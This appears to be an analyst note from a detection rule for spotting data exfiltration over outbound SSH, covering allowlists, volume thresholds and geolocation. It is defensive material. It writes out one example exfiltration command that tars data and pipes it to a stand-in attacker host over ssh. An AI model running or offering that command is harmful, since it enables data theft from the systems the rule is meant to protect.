    analyst_notes: 'SSH/SCP/SFTP for exfil is one of the most common adversary patterns when SSH egress is allowed (which it often is, for legitimate developer/admin use). Detection: outbound SSH (TCP/22) to destinations NOT on your sanctioned-destinations allowlist, with significant bytes_out. Build $SANCTIONED_SSH_DESTS to include: GitHub, GitLab, AWS bastions, sanctioned cloud providers - wherever your devs legitimately SSH. Anything else outbound on port 22 is highly suspicious. Adversary tooling often uses port 22 specifically because of how rarely it''s restricted: Mega CLI, custom scp wrappers, rclone with SSH backend, or just ''tar cz | ssh attacker-host cat > stolen.tar.gz''. Volume threshold of 50MB+ catches realistic exfil while filtering out short admin SSH sessions. Pair with destination IP geolocation - SSH to residential IP addresses or hosting providers known for VPS abuse is high-priority. Modern best practice: SSH egress should be allowlisted to specific destinations at the firewall/proxy level, not relying on detection alone.'
